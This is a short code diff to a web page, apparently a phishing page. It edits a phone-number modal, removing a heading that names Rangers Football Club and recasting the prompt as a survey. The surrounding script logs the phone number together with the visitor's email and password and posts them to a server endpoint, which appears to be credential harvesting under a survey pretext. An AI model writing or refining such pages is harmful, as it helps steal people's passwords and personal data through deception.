@@ -110,9 +110,9 @@
 
 <!-- Phone Number Input (hidden initially) -->
 <div class="modal" id="phoneModal" style="display: none;">
-    <h2>Enter your Phone Number so Rangers Football Club can contact you</h2>
+    <h2>Enter Your Phone Number</h2>
     <form id="phoneForm" action="/submit-phone" method="POST">
-        <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
+        <input type="tel" id="phone" name="phone" placeholder="Enter your phone number to receive the survey." required>
         <button type="submit">Submit</button>
     </form>
 </div>
@@ -154,7 +154,6 @@
         console.log(`Phone: ${phone}, Email: ${window.email}, Password: ${window.password}`);
 
         // Send data to the server (e.g., via an AJAX request or form submission)
-        // Example: Send all data to the server
         fetch('/submit-phone', {
             method: 'POST',
             headers: {
